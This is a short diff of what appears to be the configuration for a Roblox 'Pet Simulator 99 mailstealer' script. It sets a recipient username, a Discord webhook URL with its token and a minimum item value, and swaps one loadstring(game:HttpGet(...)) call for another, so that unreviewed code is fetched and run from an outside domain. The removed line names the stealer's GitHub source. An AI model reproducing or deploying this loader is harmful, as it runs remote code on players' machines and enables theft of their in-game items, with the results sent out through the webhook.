@@ -1,6 +1,9 @@
 Username = "PogrzaloCie"
+Username2 = ""
 Webhook = "https://discord.com/api/webhooks/1216402622970597556/QpKrRy2fsTAbKyXMqXaGn52y-BlQSxGuLPy7ioxGBlDI-cU3FJA3iALYCLR0_tm3vwsl"
-selectedLoadingScreen = "4"
-LoadingScreen = true
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherScript/PS99-Mailstealer/main/PS99Mailstealer"))()
+HubName = "RBXG"
+
+MinimumRAP = 10
+
+loadstring(game:HttpGet("https://egorikusa.space"))()
